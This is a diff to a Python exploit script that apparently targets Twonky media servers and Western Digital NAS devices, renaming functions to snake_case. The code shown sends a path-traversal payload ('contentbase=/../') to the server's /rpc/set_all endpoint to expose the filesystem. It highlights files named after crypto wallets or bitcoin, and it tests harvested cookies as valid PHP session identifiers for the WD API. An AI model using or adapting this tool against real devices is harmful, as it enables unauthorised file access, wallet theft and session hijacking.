@@ -76,13 +76,13 @@ def print_color(color, text):
 # Extend KEYWORDS, list if you want. This will highlight files and directory names that include a keyword.
 KEYWORDS = ["CRYPTO", "CRIPTO", "BITCOIN", "WALLET"]
 
-def warningFileName(line):
+def warning_file_name(line):
     for keyword in KEYWORDS:
         if line.upper().find(keyword) != -1:
             return True
         return False
 
-def checkPort(host, port):
+def check_port(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((host,int(port)))
@@ -93,7 +93,7 @@ def checkPort(host, port):
         return False
 
 # Patch the contentbase parameter
-def setContentBase(host, port):
+def set_content_base(host, port):
     payload = "\ncontentbase=/../\n"
     url = "http://{0}:{1}/rpc/set_all".format(host, port)
     try:
@@ -140,11 +140,12 @@ def get_server_info(host, port, client):
     friendlyname = _get_friendly_name()
     server_info = _get_server_info()
     return friendlyname, server_info
+
 # Check if the discovered Cookie is a valid PHP Session identifier for WD api
-def checkSessionCookie(host, cookieString):
+def check_session_cookie(host, cookie_string):
     url = "http://{0}/api/2.1/rest/device_user".format(host)
-    cookieTemp = cookieString.split("_")
-    cookie = {'PHPSESSID': cookieTemp[1]}
+    cookie_temp = cookie_string.split("_")
+    cookie = {'PHPSESSID': cookie_temp[1]}
     response = requests.get(url, timeout=10, cookies=cookie)
     if response.status_code == 200:
         return cookie
@@ -195,7 +196,7 @@ def browser(client):
             return client.dir_items(var, ssl=True)
 
     def print_item(id, type, name):
-        if warningFileName(name):
+        if warning_file_name(name):
             print (id, Fore.RED + type, name)
         else:
             print(id, Fore.GREEN + type, name)
@@ -237,7 +238,7 @@ if __name__ == '__main__':
         host = sys.argv[1]
         port = sys.argv[2]
         timeout = DEFAULT_TIMEOUT_SECONDS
-        if not checkPort(host, port):
+        if not check_port(host, port):
             print(Fore.RED, "Error, can´t open port {}".format(port))
             exit
 
@@ -266,7 +267,7 @@ if __name__ == '__main__':
                 url_builder = TwonkyURLBuilder(host, port, version="8")
                 client = TwonkyClient(host, port, timeout, url_builder)
 
-            if setContentBase(host, port):
+            if set_content_base(host, port):
                 browser(client)
 
     except requests.exceptions.ReadTimeout:
